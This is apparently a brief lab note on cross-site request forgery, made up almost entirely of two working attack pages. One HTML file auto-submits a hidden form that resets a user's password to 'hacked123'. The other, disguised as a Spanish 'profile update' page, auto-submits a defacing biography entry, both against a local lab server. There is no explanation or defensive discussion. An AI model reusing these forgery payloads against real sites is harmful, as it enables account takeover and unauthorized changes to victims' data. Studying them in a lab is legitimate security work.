## Cross-Site Request Forgery

pwned.html

```bash
<html>
<body>
<form action="http://172.17.0.2:5000/change-password" method="POST">
<input type="hidden" name="new_password" value="hacked123" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

open pwned.html

pwned2.html

```bash
<!DOCTYPE html>
<html>
<head>
<title>Actualización de Perfil</title>
</head>
<body>
<h2>Actualizando tu perfil...</h2>
<form action="http://172.17.0.2:5000/update-biografia" method="POST">
<input type="hidden" name="biografia" value="HACKED VIA CSRF - Acceso SSH comprometido" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
